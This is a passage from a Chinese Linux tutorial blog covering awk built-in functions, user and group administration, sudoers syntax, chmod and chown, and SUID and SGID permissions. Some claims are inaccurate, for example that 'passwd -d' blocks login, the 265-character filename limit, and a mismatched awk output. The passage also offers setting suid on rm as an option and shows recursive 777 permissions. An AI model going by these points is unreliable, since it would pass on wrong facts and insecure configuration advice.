<td>年份模除 100。</td>
</tr>
<tr>
<td>%Y</td>
<td>十进制表示的完整年份。</td>
</tr>
<tr>
<td>%z</td>
<td>时区，表示格式为+HHMM（例如，格式要求生成的 RFC 822或者 RFC 1036 时间头）</td>
</tr>
<tr>
<td>%Z</td>
<td>时区名称或缩写，如果时区待定则无输出。</td>
</tr>
</tbody>
</table>
<h5 id="位操作函数">位操作函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>位与操作。</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d AND %d) = %d\n&quot;, num1, num2, and(num1, num2) &#125;'</code>输出结果为：<code>(10 AND 6) = 2</code></td>
</tr>
<tr>
<td>compl</td>
<td>按位求补。</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;compl(%d) = %d\n&quot;, num1, compl(num1) &#125;'</code>输出结果为：<code>compl(10) = 9007199254740981</code></td>
</tr>
<tr>
<td>lshift</td>
<td>左移位操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;lshift(%d) by 1 = %d\n&quot;, num1, lshift(num1, 1) &#125;'</code>输出结果为：<code>lshift(10) by 1 = 20</code></td>
</tr>
<tr>
<td>rshift</td>
<td>右移位操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;rshift(%d) by 1 = %d\n&quot;, num1, rshift(num1, 1) &#125;'</code>输出结果为：<code>rshift(10) by 1 = 5</code></td>
</tr>
<tr>
<td>or</td>
<td>按位或操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d OR %d) = %d\n&quot;, num1, num2, or(num1, num2) &#125;'</code>输出结果为：<code>(10 OR 6) = 14</code></td>
</tr>
<tr>
<td>xor</td>
<td>按位异或操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d XOR %d) = %d\n&quot;, num1, num2, xor(num1, num2) &#125;'</code>输出结果为：<code>(10 bitwise xor 6) = 12</code></td>
</tr>
</tbody>
</table>
<h5 id="其他函数">其他函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>close(expr)</td>
<td>关闭管道的文件</td>
<td>`$ awk 'BEGIN { cmd = “tr [a-z] [A-Z]” print “hello, world !!!”</td>
</tr>
<tr>
<td>delete</td>
<td>用于从数组中删除元素</td>
<td><code>$ awk 'BEGIN &#123; arr[0] = &quot;One&quot; arr[1] = &quot;Two&quot; arr[2] = &quot;Three&quot; arr[3] =  &quot;Four&quot; print &quot;Array elements before delete operation:&quot; for (i in arr) &#123;  print arr[i] &#125; delete arr[0] delete arr[1] print &quot;Array elements after  delete operation:&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>输出结果为：<code>Array elements before delete operation: One Two Three Four Array elements after delete operation: Three Four</code></td>
</tr>
<tr>
<td>exit</td>
<td>终止脚本执行，它可以接受可选的参数 expr 传递 AWK 返回状态。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Hello, World !!!&quot; exit 10 print &quot;AWK never executes this statement.&quot; &#125;'</code>输出结果为：<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>flush</td>
<td>刷新打开文件或管道的缓冲区</td>
<td></td>
</tr>
<tr>
<td>getline</td>
<td>读入下一行</td>
<td>使用 getline 从文件 marks.txt 中读入一行并输出：<code>$ awk '&#123;getline; print $0&#125;' marks.txt</code>，AWK 从文件 marks.txt 中读入一行存储到变量 0 中。在下一条语句中，我们使用 getline 读入下一行。因此AWK读入第二行并存储到 0 中。最后，AWK 使用 print 输出第二行的内容。这个过程一直到文件结束。</td>
</tr>
<tr>
<td>next</td>
<td>停止处理当前记录，并且进入到下一条记录的处理过程。</td>
<td>当模式串匹配成功后程序并不执行任何操作：<code>$ awk '&#123;if ($0 ~/Shyam/) next; print $0&#125;' marks.txt</code></td>
</tr>
<tr>
<td>nextfile</td>
<td>停止处理当前文件，从下一个文件第一个记录开始处理。</td>
<td>首先创建两个文件。 file1.txt 内容如下:<code>file1:str1 file1:str2 file1:str3 file1:str4</code>文件 file2.txt 内容如下：<code>file2:str1 file2:str2 file2:str3 file2:str4</code>现在我们来测试 nextfile 函数。<code>$ awk '&#123; if ($0 ~ /file1:str2/) nextfile; print $0 &#125;' file1.txt file2.txt</code>输出结果为：<code>file1:str1 file2:str1 file2:str2 file2:str3 file2:str4</code></td>
</tr>
<tr>
<td>return</td>
<td>从用户自定义的函数中返回值。请注意，如果没有指定返回值，那么的返回值是未定义的。</td>
<td>创建文件 functions.awk，内容如下：<code>function addition(num1, num2) &#123; result = num1 + num2 return result &#125; BEGIN &#123; res = addition(10, 20) print &quot;10 + 20 = &quot; res &#125;</code>执行该文件：<code>$ awk -f functions.awk 10 + 20 = 30</code></td>
</tr>
<tr>
<td>system</td>
<td>执行特定的命令然后返回其退出状态。返回值为 0 表示命令执行成功；非 0 表示命令执行失败。</td>
<td><code>$ awk 'BEGIN &#123; ret = system(&quot;date&quot;); print &quot;Return value = &quot; ret &#125;'</code>输出结果为：<code>Sun Dec 21 23:16:07 IST 2014 Return value = 0</code></td>
</tr>
</tbody>
</table>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/Jerry00713/article/details/123867016">linux三剑客sed之模式空间与保持空间</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】用户与权限管理</title>
    <url>/posts/2b99b9f0/</url>
    <content><![CDATA[<h2 id="用户管理">用户管理</h2>
<p>用户管理包括用户与组账号的管理。</p>
<p>在Unix/Linux系统中，不论是由本机或是远程登录系统，每个系统都必须拥有一个账号，并且对于不同的系统资源拥有不同的使用权限。</p>
<p>Unix/Linux系统中的root账号通常用于系统的维护和管理，它对Unix/Linux操作系统的所有部分具有不受限制的访问权限。</p>
<p>在Unix/Linux安装的过程中，系统会自动创建许多用户账号，而这些默认的用户就称为“标准用户”。</p>
<p>在大多数版本的Unix/Linux中，都不推荐直接使用root账号登录系统。</p>
<h3 id="whoami：查看当前用户">whoami：查看当前用户</h3>
<p>查看当前系统当前账号的用户名。可通过cat /etc/passwd查看系统用户信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">whoami</span></span><br><span class="line">Corazon</span><br></pre></td></tr></table></figure>
<h3 id="who：查看登录用户">who：查看登录用户</h3>
<p>who命令用于查看当前所有登录系统的用户信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">who</span></span><br><span class="line">root     tty1         2025-02-19 12:30</span><br><span class="line">root     pts/0        2025-02-19 13:17 (10.0.0.1)</span><br></pre></td></tr></table></figure>
<p>常用选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-m或am I</td>
<td>只显示运行who命令的用户名、登录终端和登录时间</td>
</tr>
<tr>
<td style="text-align:center">-q或–count</td>
<td>只显示用户的登录账号和登录用户的数量</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>在登录时间后显示该用户最后一次操作到当前的时间间隔</td>
</tr>
<tr>
<td style="text-align:center">–heading</td>
<td>显示列标题</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>显示PID</td>
</tr>
</tbody>
</table>
<h3 id="exit：退出登录账户">exit：退出登录账户</h3>
<p>如果是图形界面，退出当前终端；</p>
<p>如果是使用ssh远程登录，退出登陆账户；</p>
<p>如果是切换后的登陆用户，退出则返回上一个登陆账号。</p>
<h3 id="useradd：添加用户账号">useradd：添加用户账号</h3>
<p>在Unix/Linux中添加用户账号可以使用adduser或useradd命令，因为adduser命令是指向useradd命令的一个链接，因此，这两个命令的使用格式完全一样。</p>
<p>useradd命令的使用格式如下： useradd [参数] 新建用户账号</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>指定用户登录系统时的主目录</td>
</tr>
<tr>
<td>-m</td>
<td>自动建立目录，未指定-d参数时会在/home/{当前用户}目录下建立主目录</td>
</tr>
<tr>
<td>-g</td>
<td>指定组名称</td>
</tr>
</tbody>
</table>
<p>相关说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux每个用户都要有一个主目录，主目录就是第一次登陆系统，用户的默认当前目录(/home/用户)；</p>
</li>
<li class="lvl-2">
<p>每一个用户必须有一个主目录，所以用useradd创建用户的时候，一定给用户指定一个主目录；</p>
</li>
<li class="lvl-2">
<p>如果创建用户的时候，不指定组名，那么系统会自动创建一个和用户名一样的组名。</p>
</li>
<li class="lvl-2">
<p>使用user创建账户后需要使用命令<code>passwd 新建用户</code>为新账户设置密码后才能登陆</p>
</li>
</ul>
<p>若创建用户时未指定家目录，后期可通过<code>usermod -d /home/abc abc</code>指定</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>useradd -d /home/abc abc -m</td>
<td>创建abc用户，如果/home/abc目录不存在，就自动创建这个目录，同时用户属于abc组</td>
</tr>
<tr>
<td>useradd -d /home/a a -g test -m</td>
<td>创建一个用户名字叫a，主目录在/home/a，如果主目录不存在，就自动创建主目录，同时用户属于test组</td>
</tr>
<tr>
<td>cat /etc/passwd</td>
<td>查看系统当前用户名</td>
</tr>
</tbody>
</table>
<h3 id="设置用户密码：passwd">设置用户密码：passwd</h3>
<p>超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd 选项 用户名</span><br></pre></td></tr></table></figure>
<p>可使用的选项：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l 锁定口令，即禁用账号。</p>
</li>
<li class="lvl-2">
<p>-u 口令解锁。</p>
</li>
<li class="lvl-2">
<p>-d 使账号无口令。</p>
</li>
<li class="lvl-2">
<p>-f 强迫用户下次登录时修改口令。</p>
</li>
</ul>
<p>普通用户修改自己的口令时，passwd命令会先询问原口令，验证后再要求用户输入两遍新口令，如果两次输入的口令一致，则将这个口令指定给用户；而超级用户为用户指定口令时，就不需要知道原口令。</p>
<p>假设当前用户是sam，则下面的命令修改该用户自己的口令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ passwd </span><br><span class="line">Old password:****** </span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>如果是超级用户，可以用下列形式指定任何用户的口令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># passwd sam </span></span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>使用root账户为用户指定空口令时，执行下列形式的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -d sam</span><br></pre></td></tr></table></figure>
<p>此命令将用户 sam 的口令删除，这样用户 sam 下一次登录时，系统就不再允许该用户登录了。</p>
<p>passwd 命令还可以用 -l(lock) 选项锁定某一用户，使其不能登录，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -l sam</span><br></pre></td></tr></table></figure>
<h3 id="usermod：修改用户">usermod：修改用户</h3>
<p>常用的选项包括<code>-c, -d, -m, -g, -G, -s, -u以及-o等</code>，这些选项的意义与<code>useradd</code>命令中的选项一样，可以为用户指定新的资源值 。</p>
<p>修改用户所在组：usermod -g 用户组 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -g <span class="built_in">test</span> abc</span><br></pre></td></tr></table></figure>
<p>改abc用户的家目录位置：usermod -d 家目录 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -d /home/abc abc</span><br></pre></td></tr></table></figure>
<p>选项<code>-l 新用户名</code>指定一个新的账号，可修改用户名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1 </span><br><span class="line">aaa:x:1001:1001::/home/aaa:</span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">sudo</span> usermod -l bbb -d /home/bbb aaa   </span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1               </span><br><span class="line">bbb:x:1001:1001::/home/bbb:</span><br></pre></td></tr></table></figure>
<h3 id="删除用户：userdel">删除用户：userdel</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>userdel abc(用户名)</td>
<td>删除abc用户，但不会自动删除用户的主目录</td>
</tr>
<tr>
<td>userdel -r abc(用户名)</td>
<td>删除用户，同时删除用户的主目录</td>
</tr>
</tbody>
</table>
<h3 id="切换用户：su">切换用户：su</h3>
<p>su后面可以加“-”会将当前的工作目录自动转换到切换后的用户主目录.</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>su</td>
<td>切换到root用户</td>
</tr>
<tr>
<td>su root</td>
<td>切换到root用户</td>
</tr>
<tr>
<td>su -</td>
<td>切换到root用户，同时切换目录到/root</td>
</tr>
<tr>
<td>su - root</td>
<td>切换到root用户，同时切换目录到/root</td>
</tr>
<tr>
<td>su 普通用户</td>
<td>切换到普通用户</td>
</tr>
<tr>
<td>su - 普通用户</td>
<td>切换到普通用户，同时切换普通用户所在的目录</td>
</tr>
</tbody>
</table>
<p>注意：对于ubuntu平台，只能通过sudo su进入root账号。</p>
<p>sudo允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。</p>
<h3 id="sudo：以root身份执行指令">sudo：以root身份执行指令</h3>
<p>sudo命令可以临时获取root权限</p>
<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">显示出自己（执行 <span class="built_in">sudo</span> 的使用者）的权限</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">以root权限执行上一条命令</span><br><span class="line"><span class="built_in">sudo</span> !!</span><br></pre></td></tr></table></figure>
<p>sudoers文件配置语法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user  MACHINE=COMMANDS</span><br><span class="line">用户 登录的主机=（可以变换的身份） 可以执行的命令  </span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">允许root用户执行任意路径下的任意命令 </span><br><span class="line">root    ALL=(ALL)       ALL</span><br><span class="line">允许wheel用户组中的用户执行所有命令  </span><br><span class="line">%wheel        ALL=(ALL)       ALL</span><br><span class="line">允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令</span><br><span class="line">%wheel        ALL=(ALL)       NOPASSWD: ALL</span><br><span class="line">允许support用户在EPG的机器上不输入密码的情况下使用SQUID中的命令</span><br><span class="line">Cmnd_Alias   SQUID = /opt/vtbin/squid_refresh, /sbin/service, /bin/rm</span><br><span class="line">Host_Alias   EPG = 192.168.1.1, 192.168.1.2</span><br><span class="line">support EPG=(ALL) NOPASSWD: SQUID</span><br></pre></td></tr></table></figure>
<h3 id="添加、删除组账号：groupadd、groupdel">添加、删除组账号：groupadd、groupdel</h3>
<p>groupadd 新建组账号 groupdel 组账号 cat /etc/group 查看用户组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupadd abc</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupdel abc</span><br></pre></td></tr></table></figure>
<h3 id="用户组管理：groupmod">用户组管理：groupmod</h3>
<p>修改用户组的属性使用groupmod命令。其语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod 选项 用户组</span><br></pre></td></tr></table></figure>
<p>常用的选项有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-g GID 为用户组指定新的组标识号。</p>
</li>
<li class="lvl-2">
<p>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。</p>
</li>
<li class="lvl-2">
<p>-n新用户组 将用户组的名字改为新名字</p>
</li>
</ul>
<p>将组group2的组标识号修改为102：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod -g 102 group2</span><br></pre></td></tr></table></figure>
<p>将组group2的标识号改为10000，组名修改为group3：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod –g 10000 -n group3 group2</span><br></pre></td></tr></table></figure>
<p>如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。</p>
<p>用户可以在登录后，使用命令newgrp切换到其他用户组，这个命令的参数就是目的用户组。例如：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>newgrp root</span><br></pre></td></tr></table></figure>
<p>这条命令将当前用户切换到root用户组，前提条件是root用户组确实是该用户的主组或附加组。类似于用户账号的管理，用户组的管理也可以通过集成的系统管理工具来完成。</p>
<h2 id="权限管理">权限管理</h2>
<h3 id="列出目录的内容：ls">列出目录的内容：ls</h3>
<p>Linux文件或者目录名称最长可以有265个字符，“.”代表当前目录，“…”代表上一级目录，以“.”开头的文件为隐藏文件，需要用 -a 参数才能显示。</p>
<p>ls常用参数：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-a</td>
<td>显示指定目录下所有子目录与文件，包括隐藏文件</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td>以列表方式显示文件的详细信息</td>
</tr>
<tr>
<td style="text-align:center">-h</td>
<td>配合 -l 以人性化的方式显示文件大小</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2b99b9f0//image-20250218170841665.png" alt="image-20250218170841665"></p>
<p>列出的信息的含义：</p>
<p><img src="/posts/2b99b9f0//ccff78bd3a3c92ac11636923216ce3ed.png" alt="img"></p>
<p>ls支持通配符：</p>
<table>
<thead>
<tr>
<th style="text-align:center">通配符</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:left">文件代表文件名中所有字符</td>
</tr>
<tr>
<td style="text-align:center">ls te*</td>
<td style="text-align:left">查找以te开头的文件</td>
</tr>
<tr>
<td style="text-align:center">ls *html</td>
<td style="text-align:left">查找结尾为html的文件</td>
</tr>
<tr>
<td style="text-align:center">？</td>
<td style="text-align:left">代表文件名中任意一个字符</td>
</tr>
<tr>
<td style="text-align:center">ls ?.c</td>
<td style="text-align:left">只找第一个字符任意，后缀为.c的文件</td>
</tr>
<tr>
<td style="text-align:center">ls a.?</td>
<td style="text-align:left">只找只有3个字符，前2字符为a.，最后一个字符任意的文件</td>
</tr>
<tr>
<td style="text-align:center">[]</td>
<td style="text-align:left">[”和“]”将字符组括起来，表示可以匹配字符组中的任意一个。“-”用于表示字符范围。</td>
</tr>
<tr>
<td style="text-align:center">[abc]</td>
<td style="text-align:left">匹配a、b、c中的任意一个</td>
</tr>
<tr>
<td style="text-align:center">[a-f]</td>
<td style="text-align:left">匹配从a到f范围内的的任意一个字符</td>
</tr>
<tr>
<td style="text-align:center">ls [a-f]*</td>
<td style="text-align:left">找到从a到f范围内的的任意一个字符开头的文件</td>
</tr>
<tr>
<td style="text-align:center">ls a-f</td>
<td style="text-align:left">查找文件名为a-f的文件,当“-”处于方括号之外失去通配符的作用</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:left">如果要使通配符作为普通字符使用，可以在其前面加上转义字符。“?”和“*”处于方括号内时不用使用转义字符就失去通配符的作用。</td>
</tr>
<tr>
<td style="text-align:center">ls \*a</td>
<td style="text-align:left">查找文件名为*a的文件</td>
</tr>
</tbody>
</table>
<h3 id="显示inode的内容：stat">显示inode的内容：stat</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stat</span> [文件或目录]</span><br></pre></td></tr></table></figure>
<p>查看 testfile 文件的inode内容内容，可以用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8 ~]# <span class="built_in">stat</span> anaconda-ks.cfg </span><br><span class="line">  File: anaconda-ks.cfg</span><br><span class="line">  Size: 1256      	Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: fd00h/64768d	Inode: 201326724   Links: 1</span><br><span class="line">Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: system_u:object_r:admin_home_t:s0</span><br><span class="line">Access: 2025-02-18 21:18:29.137289911 +0800</span><br><span class="line">Modify: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line">Change: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line"> Birth: 2025-02-18 21:18:29.137289911 +0800</span><br></pre></td></tr></table></figure>
<h3 id="文件访问权限">文件访问权限</h3>
<p>用户能够控制一个给定的文件或目录的访问程度，一个文件或目录可能有读、写及执行权限：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>读权限（r） ：对于文件，具有读取文件内容的权限；对于目录，具有浏览目录的权限。</p>
</li>
<li class="lvl-2">
<p>写权限（w） ：对于文件，具有修改文件内容的权限；对于目录，具有删除、移动目录内文件的权限。</p>
</li>
<li class="lvl-2">
<p>可执行权限（x）： 对于文件，具有执行文件的权限；对于目录，该用户具有进入目录的权限。</p>
</li>
</ul>
<p>通常，Unix/Linux系统只允许文件的属主(所有者)或超级用户改变文件的读写权限。</p>
<p>示例：</p>
<p><img src="/posts/2b99b9f0//7da5a8288cfb2d26b70da16da71b36e8.png" alt="img"></p>
<p>第1个字母代表文件的类型：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>“d” 代表文件夹</p>
</li>
<li class="lvl-2">
<p>“-” 代表普通文件</p>
</li>
<li class="lvl-2">
<p>“c” 代表硬件字符设备</p>
</li>
<li class="lvl-2">
<p>“b” 代表硬件块设备</p>
</li>
<li class="lvl-2">
<p>“s”表示管道文件</p>
</li>
<li class="lvl-2">
<p>“l” 代表软链接文件。</p>
</li>
</ul>
<p>后9个字母分别代表三组权限：文件所有者、用户组、其他用户拥有的权限。</p>
<h3 id="chmod：修改文件权限">chmod：修改文件权限</h3>
<p>chmod 修改文件权限有两种使用格式：字母法与数字法。</p>
<p>字母法：chmod u/g/o/a +/-/= rwx 文件</p>
<table>
<thead>
<tr>
<th>[ u/g/o/a ]</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>user 表示该文件的所有者</td>
</tr>
<tr>
<td>g</td>
<td>group 表示与该文件的所有者属于同一组( group )者，即用户组</td>
</tr>
<tr>
<td>o</td>
<td>other 表示其他以外的人</td>
</tr>
<tr>
<td>a</td>
<td>all 表示这三者皆是</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>[ ±= ]</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>增加权限</td>
</tr>
<tr>
<td>-</td>
<td>撤销权限</td>
</tr>
<tr>
<td>=</td>
<td>设定权限</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>rwx</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>read 表示可读取，对于一个目录，如果没有r权限，那么就意味着不能通过ls查看这个目录的内容。</td>
</tr>
<tr>
<td>w</td>
<td>write 表示可写入，对于一个目录，如果没有w权限，那么就意味着不能在目录下创建新的文件。</td>
</tr>
<tr>
<td>x</td>
<td>excute 表示可执行，对于一个目录，如果没有x权限，那么就意味着不能通过cd进入这个目录。</td>
</tr>
</tbody>
</table>
<p>数字法：“rwx” 这些权限也可以用数字来代替</p>
<table>
<thead>
<tr>
<th>字母</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>读取权限，数字代号为 “4”</td>
</tr>
<tr>
<td>w</td>
<td>写入权限，数字代号为 “2”</td>
</tr>
<tr>
<td>x</td>
<td>执行权限，数字代号为 “1”</td>
</tr>
<tr>
<td>-</td>
<td>不具任何权限，数字代号为 “0”</td>
</tr>
</tbody>
</table>
<p>如执行：chmod u=rwx,g=rx,o=r filename 就等同于：chmod u=7,g=5,o=4 filename</p>
<p>chmod 751 file：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>文件所有者：读、写、执行权限</p>
</li>
<li class="lvl-2">
<p>同组用户：读、执行的权限</p>
</li>
<li class="lvl-2">
<p>其它用户：执行的权限</p>
</li>
</ul>
<p>chmod 777 file：所有用户拥有读、写、执行权限</p>
<p>注意：如果想递归所有目录加上相同权限，需要加上参数“ -R ”。 如：chmod 777 test/ -R 递归 test 目录下所有文件加 777 权限</p>
<h3 id="修改文件所有者：chown">修改文件所有者：chown</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ ll a</span><br><span class="line">-rw-rw-r--. 1 Corazon Corazon 0 Feb 19 13:31 a</span><br><span class="line">[Corazon@rocky8:~]$ su</span><br><span class="line">Password: </span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chown</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h3 id="修改文件所属组：chgrp">修改文件所属组：chgrp</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chgrp</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Cora 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h2 id="特殊权限">特殊权限</h2>
<p>linux共12位权限，除了9位基础权限还有3个特殊权限。</p>
<h3 id="三种特殊的权限">三种特殊的权限</h3>
<h4 id="SetUID-suid">SetUID(suid)</h4>
<p><strong>命令功能：</strong> **临时使用命令的属主权限执行该命令。**即如果文件有suid权限时，那么普通用户去执行该文件时，会以该文件的所属用户的身份去执行。</p>
<p>SetUID（简写suid）：会在属主权限位的执行权限上写个s。 如果该属主权限位上有执行权限，则会在属主权限位的执行权限上写个s（小写）； 如果该属主权限位上没有执行权限，则会在属主权限位的执行权限上写个S（大写）。</p>
<p>suid数字权限是4000,设置方法：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">方式<span class="number">1</span>：</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod u+s filename</span></span><br><span class="line">方式<span class="number">2</span>：</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod 4755 filename</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>查看passwd命令的权限</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`[root@localhost ftl]``# ll /usr/bin/passwd ` `问题： ``passwd``文件的属组是root,表示只有root用户可以访问的文件，为什么普通用户依然可以使用该命令更改自己的密码？``答案：当普通用户[omd]使用``passwd``命令的时候，系统看到``passwd``命令文件的属性有大写s后，表示这个命令的属主权限被omd用户获得,也就是omd用户获得文件``/etc/shadow``的root的rwx权限`</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>由于<code>passwd</code>具有s权限，普通用户使用该命令的时候，就会以该命令的属主身份root执行该命令，于是能够顺利修改普通用户不具备修改权限的<code>/etc/shadow</code>文件。</p>
<p>希望普通用户user1可以删除某个自己没有权限删除的文件的操作方法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>sudo给user1授权rm权限</p>
</li>
<li class="lvl-2">
<p>rm设置suid</p>
</li>
<li class="lvl-2">
<p>修改被删除文件上级目录的权限</p>
</li>
</ul>
<p><strong>SetUID（简称suid）总结：</strong></p>
<ol>
<li class="lvl-3">
<p>让普通用户对可执行的二进制文件，临时拥有二进制文件的属主权限；</p>
</li>
<li class="lvl-3">
<p>如果设置的二进制文件没有执行权限，那么suid的权限显示就是S（大写字母S）；</p>
</li>
<li class="lvl-3">
<p>特殊权限suid仅对二进制可执行程序有效，其他文件或目录则无效。</p>
</li>
<li class="lvl-3">
<p>suid极其危险，如果给vim或者rm命令设置了setUID，那么任何文件都能编辑或者删除了，相当于有root权限了。</p>
</li>
</ol>
<h4 id="setGID（sgid）">setGID（sgid）</h4>
<p>**命令功能：**使用sgid可以使得多个用户之间共享一个目录的所有文件变得简单。当某个目录设置了sgid后，在该目录中新建的文件不在是创建该文件的默认所属组。</p>
<p>如果该属组权限位上有执行权限，则会在属组主权限位的执行权限上写个s（小写字母）； 如果该属组权限位上没有执行权限，则会在属组主权限位的执行权限上写个S（大写字母S）。</p>
<p>write命令的权限：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# ll <span class="regexp">/bin/</span><span class="keyword">write</span> </span><br><span class="line">-rwxr-sr-x <span class="number">1</span> root tty <span class="number">19544</span> Aug  <span class="number">9</span> <span class="number">11</span>:<span class="number">10</span> <span class="regexp">/bin/</span><span class="keyword">write</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
